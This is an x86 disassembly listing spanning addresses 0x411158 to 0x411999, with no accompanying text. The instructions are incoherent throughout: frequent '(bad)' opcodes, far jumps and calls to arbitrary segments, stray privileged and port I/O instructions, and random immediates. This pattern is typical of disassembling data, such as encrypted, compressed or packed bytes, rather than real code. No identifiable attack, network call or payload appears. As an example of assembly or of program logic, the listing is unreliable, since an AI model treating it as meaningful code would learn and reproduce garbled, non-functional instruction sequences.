  411158:	aam    0x59
  41115a:	jbe    0x411146
  41115c:	mov    ds:0x769b0589,eax
  411161:	sub    DWORD PTR [ebp+0x6be25c42],ebx
  411167:	ss das 
  411169:	dec    eax
  41116a:	(bad)  
  41116b:	fbld   TBYTE PTR [ebx+ecx*4+0x2f]
  41116f:	lahf   
  411170:	dec    DWORD PTR [bx-0x2e01]
  411175:	arpl   WORD PTR [ecx-0x33f30983],di
  41117b:	pop    eax
  41117c:	mov    esi,0x50702787
  411181:	fadd   DWORD PTR [ebx]
  411183:	mov    ds:0xfcb3a700,al
  411188:	lods   al,BYTE PTR ds:[esi]
  411189:	adc    ebp,DWORD PTR [esi-0x35]
  41118c:	push   ecx
  41118d:	mov    ecx,0x546b94d9
  411192:	shl    BYTE PTR [ebx+0x280e0b19],0xe7
  411199:	mov    BYTE PTR [ebx],0xb3
  41119c:	stc    
  41119d:	inc    esp
  41119e:	call   0xf447f2a2
  4111a3:	psrld  mm2,mm4
  4111a6:	push   edx
  4111a7:	push   edi
  4111a8:	std    
  4111a9:	mov    ds:0x132e8810,al
  4111ae:	adc    al,0x23
  4111b0:	mov    cl,0xc0
  4111b2:	ret    
  4111b3:	cwde   
  4111b4:	pop    ecx
  4111b5:	leave  
  4111b6:	repz fstp DWORD PTR [ebp+0x61]
  4111ba:	or     bh,ah
  4111bc:	loopne 0x4111a8
  4111be:	scas   al,BYTE PTR es:[edi]
  4111bf:	sub    al,0xcd
  4111c1:	push   0x4e41f2e5
  4111c6:	mov    cl,0x20
  4111c8:	jge    0x411186
  4111ca:	pop    ecx
  4111cb:	ins    DWORD PTR es:[edi],dx
  4111cc:	sub    esp,DWORD PTR [ebx]
  4111ce:	pop    edi
  4111cf:	popa   
  4111d0:	ret    0x7b71
  4111d3:	sbb    ah,ch
  4111d5:	lods   eax,DWORD PTR ds:[esi]
  4111d6:	xor    DWORD PTR [ebp-0x4d],esi
  4111d9:	imul   esi,DWORD PTR [edi+0x14],0x53ae5d28
  4111e0:	xor    eax,edi
  4111e2:	sub    al,0xce
  4111e4:	xchg   esp,eax
  4111e5:	sbb    BYTE PTR [esi-0x2],0x48
  4111e9:	test   DWORD PTR [eax],ebx
  4111eb:	call   0x8ff2:0x6c2090d
  4111f2:	xchg   BYTE PTR [edi-0x2e0a1902],al
  4111f8:	mov    ds:0x2fe6f31f,al
  4111fd:	push   es
  4111fe:	pop    edx
  4111ff:	xor    DWORD PTR [esi+eiz*4-0x76ff3040],ecx
  411206:	aas    
  411207:	pop    es
  411208:	aas    
  411209:	sub    al,BYTE PTR [edx+edx*1]
  41120c:	sub    eax,0xcccc6127
  411211:	je     0x4111fa
  411213:	or     eax,DWORD PTR [eax+0xe]
  411216:	lahf   
  411217:	fistp  WORD PTR [ebx]
  411219:	lahf   
  41121a:	sub    BYTE PTR [edx-0x491f0a6a],bh
  411220:	mov    al,ds:0xcbcd99c7
  411225:	sbb    bl,0x92
  411228:	(bad)  
  411229:	mov    esi,DWORD PTR fs:[edx+0x6a]
  41122d:	popa   
  41122e:	xor    edi,DWORD PTR [edx+0x52]
  411231:	sub    eax,0x89c2adc9
  411236:	inc    esi
  411237:	ins    BYTE PTR es:[edi],dx
  411238:	mov    al,ds:0xa76fc40b
  41123d:	and    al,0xa1
  41123f:	addr16 xchg dx,ax
  411242:	sti    
  411243:	cs inc esi
  411245:	pop    eax
  411246:	adc    DWORD PTR [ebx+0x2d365da1],0xd0eefe45
  411250:	xchg   dl,bh
  411252:	xchg   ebx,eax
  411253:	cld    
  411254:	xor    ebx,DWORD PTR [ebx]
  411256:	push   esp
  411257:	inc    esp
  411258:	test   eax,0x6195c970
  41125d:	call   0xce2a:0x2aecb485
  411264:	fwait
  411265:	hlt    
  411266:	xor    al,0x2
  411268:	js     0x4111f4
  41126a:	sbb    DWORD PTR [eax-0x55],edi
  41126d:	neg    BYTE PTR [ebx+0x12]
  411270:	mov    esp,0x7e274700
  411275:	lods   al,BYTE PTR ds:[esi]
  411276:	sub    ecx,DWORD PTR [edx]
  411278:	cmp    eax,0xe08c2d05
  41127d:	jbe    0x41129b
  41127f:	pop    ss
  411280:	xchg   ebp,eax
  411281:	adc    BYTE PTR [esi+0x77],0xf2
  411285:	int3   
  411286:	test   DWORD PTR [ecx-0x55],0x6ce8309
  41128d:	mov    eax,0x5c117411
  411292:	pop    eax
  411293:	enter  0xc42d,0xb9
  411297:	or     ah,BYTE PTR [ebx]
  411299:	aam    0x6f
  41129b:	inc    edx
  41129c:	pushf  
  41129d:	shl    BYTE PTR [edi],0x21
  4112a0:	and    bl,ah
  4112a2:	mov    bl,0xa6
  4112a4:	push   cs
  4112a5:	loop   0x4112d2
  4112a7:	ja     0x4112e6
  4112a9:	mov    ebp,0xd97c46bd
  4112ae:	inc    esi
  4112af:	cmp    DWORD PTR [edi-0x34b94940],0x26
  4112b6:	loopne 0x41125d
  4112b8:	imul   edi,edx,0xffffff99
  4112bb:	in     al,dx
  4112bc:	in     al,0x75
  4112be:	ins    BYTE PTR es:[edi],dx
  4112bf:	mov    bl,0xc7
  4112c1:	repz mov cl,0x7f
  4112c4:	pop    ecx
  4112c5:	lea    edx,[ebx-0xd86ed8e]
  4112cb:	into   
  4112cc:	dec    esi
  4112cd:	clc    
  4112ce:	and    al,0xfe
  4112d0:	sahf   
  4112d1:	push   ebx
  4112d2:	push   es
  4112d3:	push   ecx
  4112d4:	push   ebp
  4112d5:	dec    ecx
  4112d6:	dec    edi
  4112d7:	js     0x41126f
  4112d9:	icebp  
  4112da:	rcl    DWORD PTR [edi+0x25a98f9],cl
  4112e0:	call   0x2c4e962
  4112e5:	or     BYTE PTR [ebx-0x3f],dl
  4112e8:	(bad)  
  4112e9:	mov    ebp,0xd27f8178
  4112ee:	cli    
  4112ef:	lds    eax,FWORD PTR [ecx]
  4112f1:	test   ebx,esp
  4112f3:	popf   
  4112f4:	pop    ebx
  4112f5:	sub    ecx,esi
  4112f7:	push   0xffffff97
  4112f9:	adc    bh,BYTE PTR [edx]
  4112fb:	aaa    
  4112fc:	aaa    
  4112fd:	and    eax,0xc1bc7b2c
  411302:	xor    al,0xf5
  411304:	repnz add DWORD PTR [ecx+0x572a2d12],ebx
  41130b:	(bad)  
  41130c:	push   0x76
  41130e:	int3   
  41130f:	adc    BYTE PTR [edx-0x50],al
  411312:	sub    ah,BYTE PTR [esi-0xb]
  411315:	fcmovnbe st,st(2)
  411317:	jae    0x411365
  411319:	fstp   QWORD PTR [ebx+0xe7a6cfa]
  41131f:	repz in eax,0xf1
  411322:	inc    eax
  411323:	jmp    0x8719:0xb8fc9dc5
  41132a:	dec    edx
  41132b:	jb     0x4112c9
  41132d:	mov    esi,0x37b7ff93
  411332:	jnp    0x4113af
  411334:	shr    BYTE PTR [ecx-0x29255cb0],cl
  41133a:	sub    BYTE PTR [ecx],bl
  41133c:	and    eax,0xf3dd8f24
  411341:	jmp    0x411354
  411343:	push   ds
  411344:	sbb    bl,BYTE PTR [ebx+0x6b]
  411347:	sub    eax,DWORD PTR [edi]
  411349:	inc    ebx
  41134a:	aas    
  41134b:	scas   eax,DWORD PTR es:[edi]
  41134c:	or     eax,ecx
  41134e:	inc    esp
  41134f:	dec    esp
  411350:	mov    esp,0x38ea0624
  411355:	retf   0x672b
  411358:	or     BYTE PTR [edi+0x5d],dh
  41135b:	out    0x18,eax
  41135d:	repz repz inc edx
  411360:	mov    BYTE PTR [eax+0x22],dl
  411363:	pop    ss
  411364:	repnz or al,BYTE PTR [eax+0x57]
  411368:	in     al,0x83
  41136a:	sub    cl,ch
  41136c:	adc    ebp,edx
  41136e:	out    dx,al
  41136f:	ins    BYTE PTR es:[edi],dx
  411370:	daa    
  411371:	sub    BYTE PTR [ebx-0x3b],bl
  411374:	dec    ebp
  411375:	push   es
  411376:	xor    eax,0xd9a14d35
  41137b:	out    dx,al
  41137c:	jo     0x411302
  41137e:	mov    dh,0xed
  411380:	(bad)  
  411381:	in     al,dx
  411382:	or     eax,0x8a13968
  411387:	push   edx
  411388:	jae    0x4113bc
  41138a:	mov    eax,edi
  41138c:	pop    es
  41138d:	add    bl,al
  41138f:	inc    eax
  411390:	xchg   ebx,eax
  411391:	arpl   WORD PTR [edi+0xeb59f75],bp
  411397:	lock add DWORD PTR [esi-0x481c1235],esp
  41139e:	inc    edx
  41139f:	xchg   DWORD PTR [ebx-0x5d8587d3],esi
  4113a5:	ficom  DWORD PTR ds:0x4adb644c
  4113ab:	mov    esi,0x3b4fc25f
  4113b0:	popa   
  4113b1:	jmp    0xc7d5:0x9c09541f
  4113b8:	iret   
  4113b9:	and    dl,cl
  4113bb:	std    
  4113bc:	xchg   ecx,eax
  4113bd:	pushf  
  4113be:	xor    dh,BYTE PTR [edx+0x3a]
  4113c1:	mov    edx,DWORD PTR ds:0x4ff2f18d
  4113c7:	ins    DWORD PTR es:[edi],dx
  4113c8:	gs pop ebx
  4113ca:	(bad)  
  4113cb:	(bad)  
  4113cd:	pop    ecx
  4113ce:	and    eax,0xf7d98add
  4113d3:	mov    BYTE PTR [eax+eiz*1-0x8],al
  4113d7:	vpmacsdqh xmm0,xmm2,xmm2,XMMWORD PTR [edi-0x4e]
  4113de:	jns    0x4113ec
  4113e0:	cs scas eax,DWORD PTR es:[edi]
  4113e2:	lods   al,BYTE PTR ds:[esi]
  4113e3:	and    edx,DWORD PTR [ecx+0x2b979fb8]
  4113e9:	in     eax,0x46
  4113eb:	(bad)  
  4113ec:	ins    DWORD PTR es:[edi],dx
  4113ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113ee:	xor    DWORD PTR [esi-0x28c9ddd7],edi
  4113f4:	rol    BYTE PTR [edx-0x7ba06b5f],1
  4113fa:	loope  0x411408
  4113fc:	sbb    eax,0x1bf79b1
  411401:	std    
  411402:	(bad)  
  411403:	popf   
  411404:	or     DWORD PTR [esi+ebx*2+0x5777e96a],esp
  41140b:	stc    
  41140c:	(bad)  
  41140d:	pop    esp
  41140e:	jmp    0x513a5680
  411413:	inc    ecx
  411414:	jg     0x41143d
  411416:	or     edx,DWORD PTR [edi+0x5b]
  411419:	jge    0x41145a
  41141b:	hlt    
  41141c:	cmp    al,0x71
  41141e:	inc    ecx
  41141f:	xor    al,0xee
  411421:	outs   dx,BYTE PTR ds:[esi]
  411422:	ret    0x1742
  411425:	and    ch,BYTE PTR [edx+edi*8-0x5a9e97ab]
  41142c:	push   ss
  41142d:	sub    bh,BYTE PTR [esi]
  41142f:	push   esi
  411430:	sub    ebx,edi
  411432:	aaa    
  411433:	(bad)  
  411434:	mov    bl,0xae
  411436:	jle    0x411450
  411438:	fldcw  WORD PTR ds:0x720d313e
  41143e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41143f:	add    eax,0x76fe0dba
  411444:	jl     0x4114c3
  411446:	sub    bh,BYTE PTR [edi]
  411448:	mov    ebp,esi
  41144a:	xrelease mov BYTE PTR [edx],ah
  41144d:	push   ebp
  41144e:	dec    eax
  41144f:	jb     0x41149e
  411451:	sbb    edx,edi
  411453:	(bad)  [ebx]
  411455:	fs push 0xaabbdea7
  41145b:	imul   edi,DWORD PTR [edi-0x64],0xffffffce
  41145f:	jns    0x41147c
  411461:	loopne 0x411428
  411463:	leave  
  411464:	daa    
  411465:	push   edx
  411466:	faddp  st(4),st
  411468:	jmp    0x411435
  41146a:	cdq    
  41146b:	sahf   
  41146c:	cmp    bh,BYTE PTR [esi]
  41146e:	add    BYTE PTR [eax],dl
  411470:	jmp    0x1714cf28
  411475:	bound  esi,QWORD PTR [eax+0x23]
  411478:	cmp    DWORD PTR [ecx+0x3c4159f9],edi
  41147e:	rol    DWORD PTR [ebp-0xd],1
  411481:	adc    BYTE PTR [edi+ebx*4+0x4393bbc],dh
  411488:	mul    BYTE PTR [ebx-0x8]
  41148b:	add    edx,edi
  41148d:	jo     0x411495
  41148f:	nop
  411490:	addr16 ja 0x41141c
  411493:	pop    edx
  411494:	inc    esi
  411495:	call   0x4827:0xf0d703d0
  41149c:	stos   BYTE PTR es:[edi],al
  41149d:	js     0x4114dc
  41149f:	push   eax
  4114a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114a1:	sub    BYTE PTR [edx],cl
  4114a3:	addr16 mov esp,0xd108d418
  4114a9:	ss mov ecx,0x79b3de59
  4114af:	sar    DWORD PTR [ebp+0x142023f6],0x8b
  4114b6:	mov    ?,WORD PTR ds:[ebx+0x5a8a2283]
  4114bd:	and    ah,BYTE PTR [esi-0x12]
  4114c0:	int    0x5a
  4114c2:	mov    ecx,0x1bc43fe
  4114c7:	xor    al,0x5f
  4114c9:	fdiv   QWORD PTR [bp+si-0x4966]
  4114ce:	dec    DWORD PTR [ebp-0x226b1dd4]
  4114d4:	xchg   BYTE PTR [ebp+0x4a],ch
  4114d7:	mov    edx,0x5437838a
  4114dc:	xor    BYTE PTR [ebx+0x3ba09ff1],ch
  4114e2:	fldenv [ebp+0x5c63e850]
  4114e8:	inc    DWORD PTR [edi]
  4114ea:	mov    bh,0x26
  4114ec:	rcr    BYTE PTR [ebx+0x1ffb26bb],1
  4114f2:	sub    ecx,DWORD PTR [ecx]
  4114f4:	cld    
  4114f5:	mov    eax,0xcf3775c5
  4114fa:	xchg   ebx,eax
  4114fb:	dec    BYTE PTR [ebx+eiz*2-0x5d7ff7a4]
  411502:	mov    al,ds:0xe5790832
  411507:	pusha  
  411508:	jg     0x411538
  41150a:	and    DWORD PTR [ebx],esp
  41150c:	xchg   DWORD PTR [esp+esi*8+0x7e27c4c],edi
  411513:	call   0x481c2c8a
  411518:	(bad)  
  411519:	(bad)  
  41151a:	add    DWORD PTR [edi+0x6859cba9],ecx
  411520:	test   BYTE PTR [edx],ch
  411522:	int3   
  411523:	mov    cs,WORD PTR ds:0x6a621bb1
  411529:	outs   dx,DWORD PTR ds:[esi]
  41152a:	into   
  41152b:	out    0x76,eax
  41152d:	lds    eax,FWORD PTR [esi-0x68247797]
  411533:	pushf  
  411534:	pop    edi
  411535:	das    
  411536:	std    
  411537:	pushf  
  411538:	aam    0x98
  41153a:	and    al,0xb4
  41153c:	cmp    bh,cl
  41153e:	sbb    eax,0xcb1837db
  411543:	out    dx,eax
  411544:	(bad)  
  411545:	(bad)  
  411546:	dec    esi
  411547:	lea    esp,[ebp+0x20a73ccc]
  41154d:	mov    bh,0x5b
  41154f:	imul   ecx,DWORD PTR [esi],0xc78d5da9
  411555:	(bad)  
  411556:	nop
  411557:	cdq    
  411558:	sub    cl,BYTE PTR [ecx]
  41155a:	and    al,0x80
  41155c:	inc    edx
  41155d:	(bad)  
  41155e:	outs   dx,BYTE PTR ds:[esi]
  41155f:	sbb    BYTE PTR [ebp-0x2e],ch
  411562:	arpl   WORD PTR [ecx],sp
  411564:	aad    0xce
  411566:	ja     0x41150d
  411568:	xchg   esi,eax
  411569:	and    al,0x8d
  41156b:	mov    dh,0x82
  41156d:	je     0x411578
  41156f:	test   BYTE PTR [esi-0x2c],dh
  411572:	jae    0x4115c9
  411574:	es adc edi,0xffffffec
  411578:	jae    0x4115e1
  41157a:	sbb    DWORD PTR [ebp+0x3aabc08a],ebx
  411580:	imul   esi,edx,0x36
  411583:	(bad)  
  411584:	repz cmp DWORD PTR [ebp-0x7b],edi
  411588:	call   0xce39:0xdf2a8ea
  41158f:	(bad)  
  411590:	or     bh,BYTE PTR [ebx+0x59215998]
  411596:	xor    al,0x5b
  411598:	ret    0x31dd
  41159b:	lea    esp,[edx+0x48]
  41159e:	cwde   
  41159f:	fs bnd ja 0x41152b
  4115a3:	xchg   ebx,eax
  4115a4:	xor    ah,BYTE PTR [edx-0x21]
  4115a7:	jno    0x4115bf
  4115a9:	jns    0x4115e9
  4115ab:	data16 outs dx,BYTE PTR ds:[esi]
  4115ad:	fistp  DWORD PTR ds:0xee21a7ff
  4115b3:	mov    ebx,?
  4115b5:	pushf  
  4115b6:	aam    0x60
  4115b8:	gs ds je 0x411606
  4115bc:	mov    esp,0x66e6208c
  4115c1:	dec    edi
  4115c2:	mov    al,ds:0x824de8d
  4115c7:	imul   ebx,DWORD PTR [ebp-0x7ab753d3],0xfffffffb
  4115ce:	push   edi
  4115cf:	test   eax,0xa04b824
  4115d4:	test   BYTE PTR [ebp-0x2a],bh
  4115d7:	inc    ebp
  4115d8:	or     eax,0xb3c5af8f
  4115dd:	lock mov eax,ds:0xc7137d9
  4115e3:	es mov bl,ch
  4115e6:	jg     0x41165d
  4115e8:	jecxz  0x411662
  4115ea:	dec    ecx
  4115eb:	enter  0x97e1,0xd9
  4115ef:	dec    ebp
  4115f0:	adc    BYTE PTR [edi+0x6b],al
  4115f3:	adc    al,0x5f
  4115f5:	inc    eax
  4115f6:	mov    eax,ds:0xb616010c
  4115fb:	inc    edi
  4115fc:	cli    
  4115fd:	jno    0x411653
  4115ff:	jae    0x41166e
  411601:	(bad)  
  411602:	aam    0x8e
  411604:	aam    0xc
  411606:	shl    DWORD PTR [eax+0x6b38cbd4],0xd0
  41160d:	push   eax
  41160e:	cmp    al,0x39
  411610:	sub    eax,0x4ada3eaf
  411615:	or     BYTE PTR [edi+edi*4-0x30],0x1f
  41161a:	retf   
  41161b:	mov    esi,0xdb6eeee8
  411620:	jb     0x4115a2
  411622:	mov    edx,0xdb02457a
  411627:	mov    esi,0x32f4a510
  41162c:	neg    BYTE PTR [edx]
  41162e:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  411630:	bound  edx,QWORD PTR [ecx+0x60]
  411633:	dec    edx
  411634:	push   esi
  411635:	scas   eax,DWORD PTR es:[edi]
  411636:	inc    ebp
  411637:	xlat   BYTE PTR ds:[ebx]
  411638:	push   esi
  411639:	ss mov bl,0x9c
  41163c:	bound  edi,QWORD PTR [ecx+0x8c27f49]
  411642:	pop    ecx
  411643:	repz inc ecx
  411645:	cmp    ebp,DWORD PTR [ebp+edx*1+0x27744e0f]
  41164c:	mov    ebp,0xab8a1029
  411651:	fwait
  411652:	jecxz  0x411632
  411654:	scas   al,BYTE PTR es:[edi]
  411655:	(bad)  
  411656:	and    eax,0xb66f05e7
  41165b:	mov    ecx,0xf2f56e83
  411660:	imul   esi,DWORD PTR [edx-0x70],0xffffffad
  411664:	jmp    0x9ea13c1
  411669:	jle    0x41166a
  41166b:	out    0x6e,eax
  41166d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41166e:	mov    DWORD PTR [bp+di],esp
  411671:	aad    0xdf
  411673:	sbb    BYTE PTR ds:0x90faf377,dl
  411679:	hlt    
  41167a:	or     al,BYTE PTR [ecx-0x74]
  41167d:	pop    esi
  41167e:	aaa    
  41167f:	mov    dh,0x95
  411681:	jb     0x41164e
  411683:	nop
  411684:	xchg   edi,eax
  411685:	sub    al,0x3d
  411687:	adc    DWORD PTR [edx-0x6b],0x5634817
  41168e:	jns    0x4116dd
  411690:	jno    0x41165b
  411692:	fnsave [edx-0x43ea7d55]
  411698:	push   ds
  411699:	pop    edx
  41169a:	pop    ss
  41169b:	pop    ds
  41169c:	sbb    DWORD PTR ds:0x5375544,ebp
  4116a2:	mov    ebx,0x9338c9bf
  4116a7:	sub    ebp,DWORD PTR [ecx]
  4116a9:	aad    0x28
  4116ab:	ins    BYTE PTR es:[edi],dx
  4116ac:	sbb    eax,0xcb9c1b66
  4116b1:	aaa    
  4116b2:	ret    0x3bac
  4116b5:	ret    
  4116b6:	and    dh,ah
  4116b8:	inc    esp
  4116b9:	xchg   ebx,eax
  4116ba:	(bad)  
  4116bb:	out    dx,eax
  4116bc:	in     eax,0xcf
  4116be:	sub    al,0x7d
  4116c0:	inc    edx
  4116c1:	pop    esi
  4116c2:	add    esp,ecx
  4116c4:	pop    es
  4116c5:	gs daa 
  4116c7:	xor    esi,DWORD PTR [eax-0x2c]
  4116ca:	add    DWORD PTR [eax-0x7c],esp
  4116cd:	ficom  WORD PTR ds:0x3e327c7b
  4116d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116d4:	adc    al,0xa0
  4116d6:	or     al,0xcd
  4116d8:	mul    BYTE PTR [eax-0x31]
  4116db:	sub    eax,0xd6c1a939
  4116e0:	or     esi,DWORD PTR [ebx+0x4923dea0]
  4116e6:	retf   0x3b6d
  4116e9:	or     BYTE PTR [ecx],ah
  4116eb:	iret   
  4116ec:	adc    cl,dl
  4116ee:	sbb    eax,0x3944eccb
  4116f3:	leave  
  4116f4:	pop    ss
  4116f5:	push   cs
  4116f6:	fmul   st(1),st
  4116f8:	inc    edi
  4116f9:	call   0x5567:0x5b278f5f
  411700:	jae    0x4116f3
  411702:	mov    al,0x10
  411704:	ins    DWORD PTR es:[edi],dx
  411705:	pop    ecx
  411706:	pop    esi
  411707:	(bad)  
  411708:	scas   al,BYTE PTR es:[edi]
  411709:	mov    cl,0xb
  41170b:	scas   al,BYTE PTR es:[edi]
  41170c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41170d:	in     eax,0x6b
  41170f:	lock xchg ax,ax
  411712:	and    al,BYTE PTR [edi]
  411714:	int    0xf8
  411716:	mov    es,WORD PTR [ecx]
  411718:	mov    esp,0x37f7d39f
  41171d:	pop    ecx
  41171e:	jo     0x41170b
  411720:	loop   0x411749
  411722:	test   eax,0x7308dd50
  411727:	xchg   edx,eax
  411728:	in     al,0x1e
  41172a:	pop    edi
  41172b:	out    0xa7,al
  41172d:	adc    ah,BYTE PTR [ebx-0x3474800e]
  411733:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411735:	sbb    al,BYTE PTR [esi+0xa22e78c]
  41173b:	add    eax,0xa5f80ced
  411740:	out    dx,eax
  411741:	addr16 xchg esp,eax
  411743:	add    DWORD PTR [eax+0xc],edx
  411746:	add    cl,dh
  411748:	or     al,0xb
  41174a:	or     eax,0xf14bfd37
  41174f:	imul   edx,DWORD PTR [ecx-0x5a2bec7f],0xffffff92
  411756:	add    cl,ah
  411758:	push   ebp
  411759:	test   DWORD PTR [ebx-0x127aefa0],0x6e415e99
  411763:	xor    eax,0x9e0efe58
  411768:	inc    edx
  411769:	xlat   BYTE PTR ds:[ebx]
  41176a:	adc    DWORD PTR [eax+0x67],eax
  41176d:	outs   dx,BYTE PTR ds:[esi]
  41176e:	js     0x411729
  411770:	jb     0x411704
  411772:	mov    ds:0xd4579705,eax
  411777:	inc    esp
  411778:	mov    ds:0x51524f80,al
  41177d:	in     al,dx
  41177e:	call   0x7901:0x6f7fb53b
  411785:	mov    cl,0xa7
  411787:	jl     0x4117b4
  411789:	cmp    BYTE PTR [esi-0x64],0x4f
  41178d:	inc    ebx
  41178e:	push   ecx
  41178f:	(bad)  
  411790:	out    dx,eax
  411791:	fimul  WORD PTR ds:0xbc4f82a1
  411797:	ret    
  411798:	jg     0x41178b
  41179a:	jl     0x4117ef
  41179c:	inc    edi
  41179d:	jmp    0x9cdc:0xade93eb1
  4117a4:	mov    ds:0x740e864,al
  4117a9:	out    0x9,al
  4117ab:	cmp    al,0x68
  4117ad:	jo     0x41178f
  4117af:	push   0x5c
  4117b1:	lea    ebp,[edi-0x1e62be62]
  4117b7:	out    0xc1,al
  4117b9:	mov    esi,0x181f9a40
  4117be:	fwait
  4117bf:	or     DWORD PTR [esp+ebx*1],ecx
  4117c2:	daa    
  4117c3:	or     eax,0x77bd4644
  4117c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117c9:	inc    ebp
  4117ca:	dec    esp
  4117cb:	xchg   edi,eax
  4117cc:	mov    cs,WORD PTR [eax-0x70]
  4117cf:	sbb    al,0xb4
  4117d1:	xor    DWORD PTR [ecx+0x2b],esp
  4117d4:	pop    ecx
  4117d5:	mov    edi,DWORD PTR [ecx+0x7c0bc81f]
  4117db:	(bad)  
  4117dc:	retf   
  4117dd:	in     al,dx
  4117de:	mov    ds:0x3bec78db,al
  4117e3:	repnz push bx
  4117e6:	cmp    eax,0x22a2d861
  4117eb:	leave  
  4117ec:	xor    esi,DWORD PTR [ebx+0x6a6afdc2]
  4117f2:	cmp    al,0xbe
  4117f4:	sub    eax,0x4a298e4f
  4117f9:	iret   
  4117fa:	sub    DWORD PTR [edx],0x299b8fcc
  411800:	push   ss
  411801:	wbinvd 
  411803:	push   ebx
  411804:	mov    esi,0xee305630
  411809:	mov    ch,BYTE PTR [eax+0x1fddd19e]
  41180f:	inc    edx
  411810:	push   cs
  411811:	rcl    BYTE PTR [ebp+edx*1-0x6],1
  411815:	(bad)  
  411816:	xlat   BYTE PTR ds:[ebx]
  411817:	lea    esi,[ecx]
  411819:	sti    
  41181a:	jmp    0xda5d8a6b
  41181f:	fnstenv [eax+0x7]
  411822:	jmp    0xfc6b:0x743023ee
  411829:	mov    edi,0x56b82ede
  41182e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41182f:	jns    0x411877
  411831:	les    esi,FWORD PTR ds:0x6e40ef79
  411837:	(bad)  
  411838:	aaa    
  411839:	leave  
  41183a:	ds mov ecx,0x1fcfa927
  411840:	test   al,0x45
  411842:	imul   ebp,DWORD PTR [ecx+0x33b31a47],0x83f103db
  41184c:	sar    edi,cl
  41184e:	xor    edi,edi
  411850:	xor    esi,eax
  411852:	xor    ebx,0x0
  411855:	jmp    0x413be9
  41185a:	pop    ss
  41185b:	push   edx
  41185c:	mov    al,0x83
  41185f:	aam    0xe3
  411861:	imul   ebx,DWORD PTR [eax+0x68],0xa715ba54
  411868:	mov    ecx,0x626af453
  41186d:	(bad)  
  41186e:	jmp    0x4118cf
  411870:	bound  esp,QWORD PTR [edx+0x2f]
  411873:	or     cl,BYTE PTR [eax+ebp*4+0x49056495]
  41187a:	and    ah,ch
  41187c:	fcmovb st,st(1)
  41187e:	jae    0x4118bf
  411880:	sub    al,0x38
  411882:	not    BYTE PTR [ecx-0x70]
  411885:	nop
  411886:	sar    DWORD PTR [edx+edi*2+0x5e6fc4c1],cl
  41188d:	pop    es
  41188e:	js     0x4118d5
  411890:	or     edi,DWORD PTR [edi-0x1a]
  411893:	div    ebx
  411895:	in     al,0xc4
  411897:	ret    
  411898:	mov    esp,0x1ba547b9
  41189d:	pop    edi
  41189e:	or     ebx,DWORD PTR [ebx+ebx*8+0x3c]
  4118a2:	(bad)  
  4118a3:	out    dx,al
  4118a4:	adc    eax,0xeea31c03
  4118a9:	mov    ebp,0x272c0a71
  4118ae:	icebp  
  4118af:	fild   QWORD PTR [edx+0x77]
  4118b2:	cwde   
  4118b3:	dec    eax
  4118b4:	das    
  4118b5:	push   eax
  4118b6:	xchg   edi,eax
  4118b7:	arpl   WORD PTR [edx+0x1226882a],dx
  4118bd:	mov    edx,fs
  4118bf:	dec    edx
  4118c0:	mov    bl,0x18
  4118c2:	in     al,dx
  4118c3:	mov    esp,0x81035577
  4118c8:	repz aam 0xb3
  4118cb:	sbb    eax,0x42789977
  4118d0:	hlt    
  4118d1:	mov    fs,WORD PTR [ebx]
  4118d3:	and    al,0xad
  4118d5:	push   cs
  4118d6:	shl    DWORD PTR [ecx+0x7b],1
  4118d9:	push   edx
  4118da:	jns    0x4118f0
  4118dc:	xor    ah,BYTE PTR [ebx+0x6f3e512b]
  4118e2:	sub    BYTE PTR [ebp-0x5e],bh
  4118e5:	(bad)  
  4118e6:	bound  eax,QWORD PTR [edi+0x4bfeffa0]
  4118ec:	xchg   ecx,eax
  4118ed:	out    dx,al
  4118ee:	inc    edi
  4118ef:	mov    ch,0x8d
  4118f1:	sbb    al,0x57
  4118f3:	addr16 jo 0x411974
  4118f6:	sub    eax,0xe4e1826
  4118fb:	inc    edx
  4118fc:	mov    edi,0x7bfa0e9f
  411901:	xchg   ebx,eax
  411902:	shl    ah,0xeb
  411905:	jnp    0x411941
  411907:	xchg   ebx,eax
  411908:	xor    eax,0xf98a6d94
  41190d:	mov    ecx,0xef1c707f
  411912:	push   es
  411913:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411914:	and    dl,ah
  411916:	aaa    
  411917:	jno    0x411945
  411919:	xor    ebx,DWORD PTR [ebx+0x11]
  41191c:	cld    
  41191d:	inc    ebp
  41191e:	adc    esi,edi
  411920:	sub    cl,BYTE PTR [ebp-0x129b8a77]
  411926:	(bad)  
  411927:	fwait
  411928:	idiv   BYTE PTR ds:0x3df57d48
  41192e:	inc    ecx
  41192f:	je     0x411925
  411931:	bswap  edx
  411933:	dec    esi
  411934:	adc    eax,0x19c2e58b
  411939:	(bad)  
  41193a:	sysret 
  41193c:	aam    0xda
  41193e:	jo     0x41190d
  411940:	adc    eax,0x4604e1b7
  411945:	xchg   DWORD PTR [edx+edx*1+0x98fd91a],eax
  41194c:	cs pushf 
  41194e:	(bad)  
  41194f:	in     eax,dx
  411950:	js     0x41198d
  411952:	xchg   ebp,eax
  411953:	out    0x5e,al
  411955:	jge    0x411979
  411957:	xor    BYTE PTR [edx],ah
  411959:	xlat   BYTE PTR ds:[ebx]
  41195a:	mov    cl,0xe4
  41195c:	add    bh,BYTE PTR [ebx-0x6229ba07]
  411962:	(bad)  
  411963:	repnz push ebx
  411965:	jbe    0x4119ad
  411967:	ret    
  411968:	sub    dl,BYTE PTR [ebx+0x76936f5]
  41196e:	fiadd  DWORD PTR [esi]
  411970:	repnz dec ebx
  411972:	sub    DWORD PTR [edx-0x9b4b739],eax
  411978:	loop   0x4119d5
  41197a:	inc    ebp
  41197b:	fcom   st(0)
  41197d:	adc    DWORD PTR [edx-0x3aa1aa76],0xd637d067
  411987:	inc    ecx
  411988:	add    al,0x8d
  41198a:	cmp    ah,cl
  41198c:	or     DWORD PTR [ecx],0xc3b833d4
  411992:	into   
  411993:	(bad)  
  411994:	jae    0x411919
  411996:	xchg   esp,eax
  411997:	mov    dh,0x6c
  411999:	or     al,0x1a
